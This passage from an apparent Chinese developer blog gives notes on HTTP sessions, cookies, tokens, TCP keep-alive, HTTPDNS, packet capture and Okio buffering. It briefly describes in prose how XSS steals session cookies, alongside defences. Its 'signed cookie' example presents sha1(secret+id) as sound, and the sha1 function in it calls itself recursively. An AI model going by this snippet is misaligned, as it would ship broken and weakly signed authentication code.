sessionid=KWJHUG6JJM65HS2K6之类的字符串。javax.servlet.http.HttpServletRequest.getSession() 将会返回当前request相关联的HttpSession对象，如果不存在，将会创建一个。翻译一下，当一个浏览器请求来到之后，Servlet处理程序（Servlet容器内部实现）将会主动检查请求信息Cookie当中是否有JSESSIONID，若有，找到对应JSESSION的HttpSession对象，如果没有，创建一个，具体的机制在Servlet容器的实现当中。 Session就是维护会话的。 因为sessionid一般是保存在cookie里面的，而且对应的cookie的key多半是session_id这样（百度首页的叫做BIDUPSID），这就出现了很多从cookie里面拿session_id去伪造身份的xss劫持session。（其实做法很简单：就是一段js去拿document.cookie，然后ajax偷偷上传这个session_id）：防范的手段也很常见了：1.过滤用户输入，防止xss漏洞2.设置session_id这个cookie为http_only session在express js中是这么维护的 这意思就是说，当你浏览一个网页时，服务端随机产生一个 1024 比特长的字符串，然后存在你 cookie 中的 connect.sid 字段中。当你下次访问时，cookie 会带有这个字符串，然后浏览器就知道你是上次访问过的某某某，然后从服务器的存储中取出上次记录在你身上的数据。由于字符串是随机产生的，而且位数足够多，所以也不担心有人能够伪造。伪造成功的概率比坐在家里编程时被邻居家的狗突然闯入并咬死的几率还低。 4.3 自动登录的实现一些网站的“记住密码，自动登录功能”，据说discuz直接将加密的（可逆）uid和密码保存到cookie中。另外一种做法是可以尝试将Session的过期时间设置的长一点，比如一年，下次访问网站的时候就能实现自动登录了。更好一点的是是本地绝不保存用户敏感信息，登录生成一个有过期时间的的cookie或者token返回给客户端，下次打开浏览器判断下过期时间就好了。另外，现在浏览器大多带有记住密码的功能，这个锅还是丢给浏览器(用户)好了。 关于Tokendjango jwt直接把token放在header里。其实token也就是放在header中的一个key-value GET /polls/api/questions/1 HTTP/1.1 Host: localhost:8000 Content-Type: application/json Authorization: Token 93138ba960dfb4ef2eef6b907718ae04400f606a Cache-Control: no-cache Postman-Token: ddc99b57-f703-4d05-abbe-c0123d4f5fed 注意这个Authorization,后面的value是Token加上一个空格 再加上一长段加密字符串。每一次请求需要认证的接口都得把这个token带上。所以在postman里面调试的话，每次请求都得手动加上这样一个HEADER。postman里面有authentication的选项，但好像都不是这种（目测bearerToken有点像）。所以得手动加上。 论Token为什么要放在内存里 为了解决在操作过程不能让用户感到 Token 失效这个问题，有一种方案是在服务器端保存 Token 状态，用户每次操作都会自动刷新（推迟） Token 的过期时间——Session 就是采用这种策略来保持用户登录状态的。然而仍然存在这样一个问题，在前后端分离、单页 App 这些情况下，每秒种可能发起很多次请求，每次都去刷新过期时间会产生非常大的代价。如果 Token 的过期时间被持久化到数据库或文件，代价就更大了。所以通常为了提升效率，减少消耗，会把 Token 的过期时保存在缓存或者内存中。 这篇文章顺便提到了如果在Token过期的时候去实现重刷Token的操作，首先客户端绝对不会存账户密码这种敏感信息。第一次登录成功后，后台返回token(有一定时长有效期)和一个refreshToken(如果前面的token失效了，直接拿着这个去请求后台给个新的Token)。所以客户端基本上就是在onError里面判断如果是Token失效的话，拿着refreshToken去重新获取Token。 token的话，一般是和用户一一对应的， 放在http的header里也行，放在cookie里面也行（不大好，CSRF漏洞），放在post请求的body里面也行。 session和简单的token本质上都是一串加密的字符串，只不过session一般放cookie里面，浏览器对这个支持比较好，android和ios一般不会一直维护一个webview专门用来存session_id，所以用token比较合适。v2上有人讨论session和token的区别。但要是说oAuth Token，这还是比session复杂得多的。 5. 长连接像即时通讯软件，或者消息推送这种场景，都得维护一个长连接。HTTP长连接和短连接HTTP那个长连接更多的时候被叫做“持久连接”tcp 长连接 的时间默认是2小时 ： /proc/sys/net/ipv4/tcp_keepalive_time 7200 5.1长连接的实现原理 轮询 维护长连接的心跳(心跳的目的很简单：通过定期的数据包，对抗NAT超时) Tcp长连接 HTTP1.1规定了默认保持长连接（HTTP persistent connection ，也有翻译为持久连接），数据传输完成了保持TCP连接不断开（不发RST包、不四次握手），等待在同域名下继续用这个通道传输数据；相反的就是短连接。TCP的keep alive是检查当前TCP连接是否活着；HTTP的Keep-alive是要让一个TCP连接活久点。它们是不同层次的概念。TCP keep alive的表现：当一个连接“一段时间”没有数据通讯时，一方会发出一个心跳包（Keep Alive包），如果对方有回包则表明当前连接有效，继续监控。Http长连接不如说tcp长连接,Tcp是可以不断开的，http连接服务器给到response之后就断开了。TCP连接Http不过是做了tcp连接复用,http通道是一次性的，tcp不是的，这样做也是为了节省tcp通道。长连接就是Connection keep-Alive那玩意，客户端和服务器都得设置才有效。长短轮询的间隔是服务器通过代码控制的。 TCP 长连接是一种保持 TCP 连接的机制。当一个 TCP 连接建立之后，启用 TCP Keep Alive 的一端便会启动一个计时器，当这个计时器到达 0 之后，一个 TCP 探测包便会被发出。这个 TCP 探测包是一个纯 ACK 包，但是其 Seq 与上一个包是重复的。打个比喻，TCP Keep Alive 是这样的：TCP 连接两端好比两个人，这两个人之间保持通信往来（建立 TCP 连接）。如果他俩经常通信（经常发送 TCP 数据），那这个 TCP 连接自然是建立着的。但如果两人只是偶尔通信。那么，其中一个人（或两人同时）想知道对方是否还在，就会定期发送一份邮件（Keep Alive 探测包），这个邮件没有实质内容，只是问对方是否还在，如果对方收到，就会回复说还在（对这个探测包的 ACK 回应）。需要注意的是，keep alive 技术只是 TCP 技术中的一个可选项。因为不当的配置可能会引起诸如一个正在被使用的 TCP 连接被提前关闭这样的问题，所以默认是关闭的 短连接： 每个连接的建立都是需要资源消耗和时间消耗.短连接都是连接建立后，client向server发送消息，server回应client，一次读写完成。连接的任意一方都可以关闭连接，一般是client主动关闭。前端网页一般用短连接，一个网页会发很多请求，如果这些全部作为长连接保留下来，服务器扛不住。这也就突出了短连接的好处，管理方便。 长连接：区别于短连接的是，完成一次读写后，后续的读写操作都继续使用这个连接。存在的问题是，如果一直保持着连接，服务器可能被拖垮，这时候可以限制单用户的最大连接数。长连接一般用于操作频繁，点对点的通讯，且连接数不能太多的情况。因为没有了耗时的三次握手及断开，适用于比较及时的应用场景。例如，与数据库的连接用长连接，短连接频繁的操作会造成Socket错误，并且频繁的Socket创建也是对操作系统资源的浪费。 5.2 keep-Alive和WebSocket的区别 5.3 http2可以实现推送了5.4 Http这玩意就不是为了视频流设计的HTTP wasn’t really designed for streaming 5.5 主流浏览器浏览器默认最大并发连接数浏览器不可能同时发起10000个请求，所以主流浏览器都设定了限制,主要是http1.1,http2的话，只有一条connection。解释 5.6 TLS,SSLhttps = Hyper Text Transfer Protocol over Secure Socket Layer 。是以安全为目标的http通道，简单讲是HTTP的安全办，即http下假如SSL层，HTTPS安全的基础是SSL。https是可能被劫持的，只要导入了一个不知名的根证书 5.7 什么叫 Pipeline 管线化 HTTP1.0 不支持管线化，同一个连接处理请求的顺序是逐个应答模式，处理一个请求就需要耗费一个 TTL，也就是客户端到服务器的往返时间，处理 N 个请求就是 N 个 TTL 时长。当页面的请求非常多时，页面加载速度就会非常缓慢。 从 HTTP1.1 开始要求服务器支持管线化，可以同时将多个请求发送到服务器，然后逐个读取响应。这个管线化和 Redis 的管线化原理是一样的，响应的顺序必须和请求的顺序保持一致。 6. WebSocket、SPDY、Http2WebSocket一种在单个TCP 连接上进行全双工通讯的协议。HTTP/2（超文本传输协议第2版，最初命名为HTTP 2.0），简称为h2（基于TLS/1.2或以上版本的加密连接）或h2c（非加密连接），是HTTP协议的的第二个主要版本SPDY也就是HTTP/2的前身，一种开放的网络传输协议，由Google开发，用来发送网页内容。基于传输控制协议（TCP）的应用层协议 7. DNS(domain Name System)通过java代码调用DNS的方式 public class Test { public static void main(String[] args) throws UnknownHostException { //获取本机IP地址 System.out.println(InetAddress.getLocalHost().getHostAddress()); //获取www.baidu.com的地址 System.out.println(InetAddress.getByName(&quot;www.baidu.com&quot;)); //获取www.baidu.com的真实IP地址 System.out.println(InetAddress.getByName(&quot;www.baidu.com&quot;).getHostAddress()); //获取配置在HOST中的域名IP地址 System.out.println(InetAddress.getByName(&quot;TEST&quot;).getHostAddress()); } } 运营商劫持有两种：DNS劫持(这个都懂)和数据劫持(在返回的内容中强行插入广告等其他内容，这种一般是对http下手)。 (360、腾讯、小米、今日头条等公司联名抵制运营商流量劫持)客户端反DNS劫持的手段(ip直连)： 遭遇DNS劫持 IP直连，httpdns的原理非常简单，主要有两步：A、客户端直接访问HttpDNS接口(直接用ip地址访问)，获取业务在域名配置管理系统上配置的访问延迟最优的IP。（基于容灾考虑，还是保留次选使用运营商LocalDNS解析域名的方式）B、客户端向获取到的IP后就向直接往此IP发送业务协议请求。以Http请求为例，通过在header中指定host字段，向HttpDNS返回的IP发送标准的Http请求即可。https，注意https是解决链路劫持的方案，并无法解决DNS劫持的问题。https安全但性能稍差 httpdns方案及需要注意的点非常多 美团 证书校验,sni，还有ip直连导致的连接复用失效等等sni场景下可能出现的问题 通常情况下，一台服务器往往会配置多个域名来建立不同 Web 站点或提供不同的服务。例如，域名 a.com 和 b.com 都同时解析到同一 IP 1.1.1.1 上，然后服务器根据客户端请求中的 Host 字段来区分，将请求分配给不同的后台服务来处理。如前面所述，对于 HTTPS 请求前，需要额外进行 SSL/TLS 握手，但是由于服务器配置了多个域名的 SSL 证书，在握手发送证书时，不知道客户端访问的是哪个域名（因为握手是在某一具体请求之前进行的），所以无法根据不同域名发送不同的证书。SNI(Server Name Indication) 就是为了解决一个服务器使用多个域名和证书的 SSL/TLS 扩展。它的工作原理是：在进行 SSL/TLS 握手之前，先发送要访问站点的域名（Hostname），这样服务器会根据这个域名返回一个合适的证书。目前，大多数操作系统和浏览器以及主流 HTTP 服务器软件都已经很好地支持 SNI 扩展。但是同样的问题又来了，当我们采用 HTTPDNS 解析域名，如前所述，请求 URL 中的 host 会被替换成解析后的 IP，此时握手前发送的 SNI 字段是 IP，导致服务器最终获取到的”域名”仍然为 IP，无法找到匹配的证书，只能返回默认的证书或者不返回，所以也会出现 SSL/TLS 握手不成功的错误。 sni解决方案 WebView中反运营商DNS劫持的手段生产环境使用腾讯云的httpdns得了,腾讯云的网站上也挂出了一个dns解析的入口 java层用反射接管InetAddress.getAllByName， native层把 getaddrinfo 的内存地址替换成自定义的 my_getaddrinfo 地址 目前okHttp是不遵守dns的ttl查询结果的 Jesse Wilson的依据是，浏览器没这么做 至于原理嘛：在腾讯云的httpdns的jar文件解压之后找到一个MSDKDnsResolver文件，里面有几个很显眼的ip:182.254.116.117182.254.16.100找一下这个ip: 广东省深圳市 深圳市腾讯计算机系统有限公司电信节点(BGP)， ip直连无疑了。腾讯云的文档上还指出WebViewClient有一个方法shouldInterceptRequest可以在webview里面使用 今日头条、小米、腾讯等六公司联合抵制流量劫持 已有多项证据直接指向某些机构 8.Fiddler抓包 手机和电脑连接同一个wifi 从https://www.telerik.com/download/fiddler 下载Fiddler 启动并配置: Tools-&gt;Fiddler-&gt;Connections, check “allow remote computers to connect” and default port is 8888 配置手机：选择连接的网络-&gt;修改网络-&gt;代理设置:手动; 代理服务器主机名为电脑的ip，端口8888，ip DHCP 抓包查看 9.Ajax和jQuery发起POST请求的时候设置的Content-Type对于服务器很重要AJAX POST请求中参数以form data和request payload形式在servlet中的获取方式 最近在看书时才真正搞明白，服务器为什么会对表单提交和文件上传做特殊处理，因为表单提交数据是名值对的方式，且Content-Type为application/x-www-form-urlencoded，而文件上传服务器需要特殊处理，普通的post请求（Content-Type不是application/x-www-form-urlencoded）数据格式不固定，不一定是名值对的方式，所以服务器无法知道具体的处理方式，所以只能通过获取原始数据流的方式来进行解析。jquery在执行post请求时，会设置Content-Type为application/x-www-form-urlencoded，所以服务器能够正确解析，而使用原生ajax请求时，如果不显示的设置Content-Type，那么默认是text/plain，这时服务器就不知道怎么解析数据了，所以才只能通过获取原始数据流的方式来进行解析请求数据。 ===========================trash here=====================================经常说的网速 bps (bits per second)，所以跟byte比起来，要除以8。1024kbps的带宽就意味着每秒传递的数据大小为1024/8=128KB。1024s就是128MB（这下清楚了） css sprites在http2的环境下并不完全无效 一些优化[TTFB] TTFB（Time To First Byte），客户端发出请求到收到响应的第一个字节所花费的时间。一般浏览器里面都能看到，这也是服务端可以优化的指标。 GZip压缩文本还可以，图片就没必要开压缩了，因为图片本身就高度压缩了，再压只是浪费CPU。 网络协议，架构，规范，spdy,http2,url规范.OSI七层网络体系结构 ： 物理层(IEEE 802.2)、数据链路层(ARP,RARP)、网络层(ip,icmp)、传输层(tcp,udp)、表示层、会话层(SSL,TLS)、应用层(HTTP,FTP,SMTP,POP3).这里面Socket比较特殊，Socket是一组编程接口（API）。介于传输层和应用层，向应用层提供统一的编程接口。应用层不必了解TCP/IP协议细节。直接通过对Socket接口函数的调用完成数据在IP网络的传输。 OSI Model 7 - application / firefox/chrome/email/HTTP6 - Presentation OS / letters$numbers -&gt; ASCII5 - Session / Conversation between computers4 - Transport / Packets are delived reliably(比如发送顺序和接受顺序一致)3 - Network / Dtetermine best route for data2 - Data link / NICS’s(Network interface cards) checking for errors(比如switches)1 - Physical Cabel / fiber optic cable / electronic signals 论https位于osi的第几个层级The SSL protocol is implemented as a transparent wrapper around the HTTP protocol. In terms of the OSI model, it’s a bit of a grey area. It is usually implemented in the application layer, but strictly speaking is in the session layer. Modem(调制解调器)：调制解调器是一种计算机硬件，它能把计算机的数字信号翻译成可沿普通电话线传送的模拟信号，而这些模拟信号又可被线路另一端的另一个调制解调器接收，并译成计算机可懂的语言。这一简单过程完成了两台计算机间的通信(电流变化-&gt; 无线电 这个过程叫做调制，无线电引起电磁场变化从而产生电流变化，这个过程叫做解调)。电信办宽带经常送的光猫的学名叫做光网络终端（俗称光猫或光modem），是指通过光纤介质进行传输，将光信号调制解调为其他协议信号的网络设备。光猫设备作为大型局域网、城域网和广域网的中继传输设备。不同于光纤收发器，光纤收发器只是收光和发光，不涉及到协议的转换。其实就是把0110这些二进制转换成在光纤中传输的光信号。 HLS直播流慢(延迟高)是因为基于HTTP，(http live streaming，苹果提出的)如果要低延迟还得rmtp 应用层面的Http，SMTP,FTP,POP,TLS/SSL,IMAP tcp和udp的全名是：Transmission Control Protocol (TCP)User Datagram Protocol (UDP) tcp三次握手，四次挥手在UDP中，每次发送数据报时，需要附带上本机的socket描述符和接收端的socket描述符。而由于TCP是基于连接的协议，在通信的socket对之间需要在通信之前建立连接，因此会有建立连接这一耗时存在于TCP协议的socket编程。 在UDP中，数据报数据在大小上有64KB的限制。而TCP中也不存在这样的限制。一旦TCP通信的socket对建立了连接，他们之间的通信就类似IO流，所有的数据会按照接受时的顺序读取。 UDP是一种不可靠的协议，发送的数据报不一定会按照其发送顺序被接收端的socket接受。然而TCP是一种可靠的协议。接收端收到的包的顺序和包在发送端的顺序是一致的。 TCP适合于诸如远程登录(rlogin,telnet)和文件传输（FTP）这类的网络服务。因为这些需要传输的数据的大小不确定。而UDP相比TCP更加简单轻量一些。UDP用来实现实时性较高或者丢包不重要的一些服务。在局域网中UDP的丢包率都相对比较低。 tls,https加密过程，sha1和sha256加密算法 ping ,traceRouter tcp三次握手四次挥手，用人话说：因为HTTP是一个基于TCP的协议,而TCP是一种可靠的传输层协议.建立TCP连接时会发生:三次握手(three-way handshake)firefox &gt; nginx [SYN] 在么nginx &gt; firefox [SYN, ACK] 在firefox &gt; nginx [ACK] 知道了 关闭TCP连接时会发生:四次挥手(four-way handshake)firefox &gt; nginx [FIN] 我要关闭连接了nginx &gt; firefox [ACK] 知道了,等我发完包先nginx &gt; firefox [FIN] 我也关闭连接了firefox &gt; nginx [ACK] 好的,知道了 几个报文的标识的解释:SYN: synchronization(同步)ACK: acknowledgement(确认:告知已收到)FIN: finish(结束) 链接：https://www.zhihu.com/question/67772889/answer/257170215 开启浏览器内支持webp关于WebP接入方案一般的做法是在nginx里面判断请求头，如果有accept: image/webp 这样的字段的话，那么就返回webp图片，否则返回png图片，当然webp图片可能是临时生成的。 单个网卡最多65535个端口2的16次方 = 65536。 2的32次方 = 4GB（大致是32位系统不能识别4G以上内存的原因）wiki上对于tcp的解释描述了一个数据包的结构中，前两个byte(16个bit，2的16次方)用于存储source port，第16-31个byte存储destination port(依旧是2个bytes，2的16次方)。这也就是65536个端口限制的由来。 短网址(short URL)系统的原理及其实现 301 是永久重定向，302 是临时重定向。短地址一经生成就不会变化，所以用 301 是符合 http 语义的。同时对服务器压力也会有一定减少。但是如果使用了 301，我们就无法统计到短地址被点击的次数了。而这个点击次数是一个非常有意思的大数据分析数据源。能够分析出的东西非常非常多。所以选择302虽然会增加服务器压力，但是我想是一个更好的选择。 Android微信智能心跳方案为什么基于TCP的应用需要心跳包（TCP keep-alive原理分析） Socket分为Internet Socket(学名叫做Berkeley or BSD sockets)和Unix domian Socket，前者是用于网络通信的，后者是用于同一个host上不同Process间通信的 ipv6 ping6 参考 谈谈HTTP协议中的短轮询、长轮询、长连接和短连接 http请求的TCP瓶颈 Restfull架构详解 文件断点续传原理,CountdownLatch 断点续传实现 一张非常好的解释status code的表格 tcp-ip较好的解释 基本算是计算机网络教程的 C10K问题 服务器常用端口以及TCP/UDP端口列表 tcp dump + wireShark抓包详细教程 httpOnly：浏览器里面用js去调用document.cookie这个api时就不会拿到这个被设置了httponly的cookie了 Set-Cookie: =[; =] [; expires=][; domain=] [; path=][; secure][; HttpOnly] HttpOnly就是在设置cookie时接受这样一个参数，一旦被设置，在浏览器的document对象中就看不到cookie了,主要是为了避免（cross-site scripting）XSS attack cookie 和 session参考 签名(signedCookies)server一般不会在client端cookie中保留敏感信息，所以比方说我们要存一个user_id，正常也应该存在session中（后台的redis根据请求头中的session_id自己去找）。假如非要存client端的cookie中，可以这么干：sever端保留一段随机的String，server将用户的user_id(存在后台)用sha1算法加密比如 var secret = &quot;some_very_important_key&quot;; // 这段secret越长，暴力破解的难度越大 function sha1(real_user_id){ return sha1(secret+real_user_id); } 实际使用中:user_id： John Doe即 “some_very_important_keyJohn Doe” = ‘a0d63c5c4194a1d2a67b96391d8d52954ac3512e’;在线sha1工具所以client端最终保存的是”user_id_signed”: “a0d63c5c4194a1d2a67b96391d8d52954ac3512e”后台收到请求之后，在后台服务的数据库中SELECT * FROM USER_TABLE WHERE user_id_signed = “a0d63c5c4194a1d2a67b96391d8d52954ac3512e”;找到了的话就一切正常，找不到就403；上述过程即”签名，专业点说，叫 信息摘要算法”。 在yahoo上找到这样的评论: SHA1通常不是用來加密資料，而是用來產生資料的特徵碼 (fingerprint)，你是不是用錯演算法啦 ??是的~~sha-1是不可逆的 也即sha1过程是不可逆的加密解密需要耗费cpu资源，暴力破解哈希值的成本太高。值得注意的是，上面那个在线加密网站中有些加密方法是可加密可解密(AES)的，有些根本没有解密的选项(SHA1,MD5),有些比较奇怪的(BASE64编码，BASE64解码，BASE64还能将图片转成一大串字符串)； 对称加密(cookie-session)session 可以存在 cookie 中sessionData 中，丢到客户端。var sessionData = {username: ‘alsotang’, age: 22, company: ‘alibaba’, location: ‘hangzhou’}用sha1算法加密之后丢到cookie的 signedCookies 跟 cookie-session 还是有区别的：1）是前者信息可见不可篡改，后者不可见也不可篡改2）是前者一般是长期保存，而后者是 session cookiecookie-session 的实现跟 signedCookies 差不多。不过 cookie-session 我个人建议不要使用，有受到回放攻击的危险。所以最好把cookie session 也丢进缓存 初学者容易犯的一个错误是，忘记了 session_id 在 cookie 中的存储方式是 session cookie。即，当用户一关闭浏览器，浏览器 cookie 中的 session_id 字段就会消失。常见的场景就是在开发用户登陆状态保持时。 GZIP是需要耗费cpu的，也就是一种以cpu资源换取带宽的策略 If you keep gzip compression enabled here, note that you are trading increased CPU costs in exchange for your lower bandwidth use. Set the gzip_comp_level to a value between 1 and 9, where 9 requires the greatest amount of CPU resources and 1 requires the least. The default value is 1. windows下host文件修改很简单，linux下在/etc/hosts里。这里面都写了一句映射： localhost : 127.0.0.1 ## the local loopback interface. 补上一个在windows上安装curl的方法how-do-i-install-set-up-and-use-curl-on-windows。简单说就是下一个windows x64的版本，然后把curl.exe所在位置添加到环境变量的PATH中，重启cmd就好了。然后开始测试一些主流网站 126邮箱返回301(Moved Permanently)，同时告诉浏览器去https站点访问 curl -v mail.126.com * Rebuilt URL to: mail.126.com/ * Trying 220.181.15.150... * TCP_NODELAY set * Connected to mail.126.com (220.181.15.150) port 80 (#0) &gt; GET / HTTP/1.1 &gt; Host: mail.126.com &gt; User-Agent: curl/7.58.0 &gt; Accept: */* &gt; &lt; HTTP/1.1 301 Moved Permanently &lt; Server: nginx &lt; Date: Sun, 11 Feb 2018 06:16:02 GMT &lt; Content-Type: text/html &lt; Content-Length: 178 &lt; Connection: keep-alive &lt; Location: https://mail.126.com/ &lt; &lt;html&gt; &lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt; &lt;body bgcolor=&quot;white&quot;&gt; &lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt; &lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; * Connection #0 to host mail.126.com left intact wireshark在windows下也能抓包，首先安装，安装好之后如果没有检测出网卡，需要去下载一个win10pcap。 wireShark抓包发现，每个package其实就是发送了一大堆hexoDecimal。 开头是本机网卡的mac地址(6个bytes)，紧跟着是ip(src和dst),最后一部分是tcp(包括port等)。wikipedia上说 MAC地址共48位（6个字节），以十六进制表示。前24位由IEEE决定如何分配，后24位由实际生产该网络设备的厂商自行指定。 我已经猜到根据MAC地址识别网卡生产商了。 NAT超时[这个主要是移动端保活的话题下需要关注的]因为 IP v4 的 IP 量有限，运营商分配给手机终端的 IP 是运营商内网的 IP，手机要连接 Internet，就需要通过运营商的网关做一个网络地址转换(Network Address Translation，NAT)。简单的说运营商的网关需要维护一个外网 IP、端口到内网 IP、端口的对应关系，以确保内网的手机可以跟 Internet 的服务器通讯。大部分移动无线网络运营商都在链路一段时间没有数据通讯时，会淘汰 NAT 表中的对应项，造成链路中断。长连接心跳间隔必须要小于NAT超时时间(aging-time)，如果超过aging-time不做心跳，TCP长连接链路就会中断，Server就无法发送Push给手机，只能等到客户端下次心跳失败后，重建连接才能取到消息。 NAT映射(把192.168.1.xx转换成外部ip和port的方案) TCP长连接本质上不需要心跳包来维持，因为无论客户端还是服务器都不知道两者之间的额通道是否断开了。心跳包一个主要的作用就是防止NAT超时的。 ===============================服务器返回的Sst-Cookie可以像上面一样有很多个。Set-Cookie: BAIDUID=259D5F393E329E8E44651C589037C093:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com基本上格式就是： SOMEKEY=SOMEVALUE; expires=某个日期; path=”某个路径”; domain=”某个主站” expires,path,domain这些东西都是规范，下一次请求是，只有当这个cookie的domain和path匹配的上才会发送这个Cookie。 至少在linux和mac环境下，mac地址是可以改的。 ifconfig eth0 downifconfig eth0 hw ether xx:xx:xx:xx:xx:xxifconfig eth0 up m3u8就是很多ts文件的目录【腾讯bugly干货分享】HTML 5 视频直播一站式扫盲.m3u8 文件，其实就是以 UTF-8 编码的 m3u 文件，这个文件本身不能播放，只是存放了播放信息的文本文件：就是说把一个视频切割成很多个TS分片文件。这里面还能牵扯到防盗链等问题。 在vimeo上见过.m4s这种后缀的流媒体 exoplayer的作者在medium上的一篇文章解释了dash在直播协议中的优点翻译一下 adaptive streaming over HTTP的协议有三种，HTTP Live Streaming (HLS),SmoothStreamingDynamic Adaptive Streaming over HTTP (DASH)HLS是最流行的 这三种直播协议都将视频文件切割成很多个小的chunks，同时允许client在不同的画质之间切换。DASH and SmoothStreaming with fMP4 都要求不同画质之间的chunk boundaries对齐，所以客户端在不同画质之间切换的时候就不需要下载那些重叠的部分了，但HLS不是这样的。尤其是在用户从网速快切换到网速差的情况下，体验更差。 Linux下TCP延迟确认(Delayed Ack)机制导致的时延问题分析 TCP Nagle算法&amp;&amp;延迟确认机制(微软更新KB328890) 301和302的区别看上去不大，但平时几乎看不到301的原因就在于301的结果会被浏览器缓存，下回访问这个url浏览器都不会发出网络请求，所以本着不要做绝的原则，绝大多数人都不会返回301","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"OkHttp和Okio阅读笔记","date":"2017-07-21T00:02:56.000Z","path":"2017/07/21/2017-07-21-okhttp-demisified/","text":"很早的时候就知道，OkHttp在io层面上的操作是由Okio代为完成的，所以实际意义上和Socket打交道的应该是Okio。而Okio又比传统的java io要高效。所以，在分析OkHttp之前，有必要针对Okio的一些方法进行展开，作为后面读写操作的铺垫。 Okio -&gt; OkHttp -&gt; Picaso -&gt; RetrofitOkio版本 1.13.0OkHttp版本 3.8.0 1. Okio与java io相比的优势java的InputStream可以被查看成是一个数据的来源，调用read方法从中读取数据。由于有些文件特别大，我们不可能在内存中分配一个和文件大小一样大的字节数组来专门来读写文件。因此需要传入一个缓冲数组。所以一般的读写程序的代码是这么写的 public abstract class InputStream implements Closeable{ public int read(byte b[]) throws IOException { return read(b, 0, b.length); } } public static void main(String[] args) throws Exception { // 指定要读取文件的缓冲输入字节流 BufferedInputStream in = new BufferedInputStream(new FileInputStream(&quot;F:\\\\test.jpg&quot;)); File file = new File(&quot;E:\\\\test.jpg&quot;); if (file != null) { file.createNewFile(); } // 指定要写入文件的缓冲输出字节流 BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file)); byte[] bb = new byte[1024];// 用来存储每次读取到的字节数组 int n;// 每次读取到的字节数组的长度 while ((n = in.read(bb)) != -1) { out.write(bb, 0, n);// 写入到输出流 } out.close();// 关闭流 in.close(); } BufferedInputStream和BufferedOutputStream就是提供了这样的缓冲策略，其内部默认分配了一个默认大小的字节数组，或者在read方法中传入一个字节数组，每次一个byte一个byte的读，然后将读出来的内容写进outPutStream。读到-1就是文件终止(EOF)。具体原理可以参考IBM的深入分析 Java I/O 的工作机制。那么问题来了，buffer[]作为一个字节数组，其容量是恒定的。假设我们想要一次性读取特别多的数据怎么办。例如http的response header一般长这样,然而实际上在无线电传播的过程中，每一行的后面都跟了一个换行符’\\r\\n’,而且无线电传播的时候其实根本没有换行的概念，就是一个字节跟着一个字节。假如服务器自己定义了特别长的header字段，inputstream读到这里的时候，事先预设的字节数组(没法改了)装不下，一种简单粗暴的方式是尝试扩容，这就意味着要把数据从原始数组copy到新的数组，丢掉旧的数组，把指针指向新的数组(一个是allocate数组，一个是arrayCopy，这俩都造成了性能损耗),当然jdk肯定不是这么干的。BufferedInputStream是用来做提供了缓存的效果，DataInputStream提供了读取基本数据类型的功能(比方说4个bytes当成一个int)，InputStreamReader的read方法需要提供一个char[]，然后外部拿着这个char[]去生成一个String. HTTP/1.1 200 OK Bdpagetype: 1 Bdqid: 0xc8f942640001e753 Bduserid: 0 Cache-Control: private Connection: Keep-Alive Content-Encoding: gzip Content-Type: text/html; charset=utf-8 Date: Fri, 21 Jul 2017 15:35:58 GMT Expires: Fri, 21 Jul 2017 15:35:29 GMT Server: BWS/1.1 Set-Cookie: BDSVRTM=0; path=/ Set-Cookie: BD_HOME=0; path=/ Set-Cookie: H_PS_PSSID=1428_21110_20930; path=/; domain=.baidu.com Strict-Transport-Security: max-age=172800 Vary: Accept-Encoding X-Powered-By: HPHP X-Ua-Compatible: IE=Edge,chrome=1 Transfer-Encoding: chunked 对于Http这种频繁的读写操作，allocate数组和copy数据无形中减慢了网络访问的速度。 Okio的解决方案 Buffer buffer = new Buffer();//cheap ,allocation literal nothing buffer.writeUtf8(&quot;Hello Okio&quot;); //java中一个英文字符占一个字节(byte)，一个汉字占2个字节(byte) buffer.writeUtf8(&quot;you can &quot;); //可以想象segment中被塞进了&quot;you can &quot;这几个byte buffer.writeUtf8(&quot;Go faster&quot;); Okio将读写操作集中到到Buffer这个类中，用Sink和Source分别代表数据的去向和来源。而数据的承载类是Segment,读取数据(read)的时候从SegmentPool中索取Segment，读到Segment的byte[]数组中，装不下了再拿一个Segment。这个过程中是没有 new byte[]操作的。 Read from a source， write to a sink public final class Buffer implements BufferedSource, BufferedSink, Cloneable { Segment head; long size; public Buffer() { //构造函数里不分配任何对象，所以创建一个Buffer几乎没有什么性能开销 } final class Segment { static final int SIZE = 8192; static final int SHARE_MINIMUM = 1024; final byte[] data; int pos; int limit; boolean shared; boolean owner; Segment next; Segment prev; } } 现在那个读取一个文件写到另一个文件的程序可以写成这样: sink = Okio.sink(dstFile); //返回了一个Sink匿名类，write的时候使用public void write(Buffer source, long byteCount)方法进行写操作 source = Okio.source(srcFile); Buffer buf = new Buffer(); for (long readCount; (readCount = source.read(buf, 2048)) != -1; ) { sink.write(buf, readCount); } 看起来还是在数据源和数据终点之间塞了一个缓冲层，sink(dst)和source(src)都是接口，Buffer同时实现了这俩接口。write是从外面拿数据塞到自己的数组中，所以每次写的时候或让Buffer的Size变大(从segment pool中借用segment)。Buffer(Source)的read方法是把数据从Buffer中拿出来，所以会让Buffer的size变小(每一个Segment读完了会返回到segment pool中)在Buffer的所有readXXX方法中都能看到这么一句话 SegmentPool.recycle(segment)因为Buffer内部是通过Segment的next和prev实现了双向链表，write是在尾部添加数据，read是从头部读取数据并移除。 Okio能够实现高效率的核心在于,在java的inputStream和BufferedInputStream中，如果两块缓冲区之间想要交换数据。前面提到的扩容情况，从一个数组把数据复制到另一个更大的数组，必须走arrayCopy。网上查找了很多博客，总的来说就是java io采用了装饰者模式，不同Stream之间要包一层。写数据时，写原始数据要用DataOutputStream，使用带缓冲的写要用BuffedOutputStream，使用字符编码要用OutputStreamWriter,写字节数组有ByteArrayOutputStream。读数据时也是，原始数据要用DataInputStream，带缓冲的要用BufferedInputStream,字符编码要用InputStreamReader，读字节数有ByteArrayInputStream。 来看下其中带buffer的装饰类是怎么创建的，顺便把java io批判一下。 ByteArrayOutPutStream baos = new ByteArrayOutPutStream(); ByteArrayInputStream bis = new ByteArrayInputStream(baos.toByteAarray()); 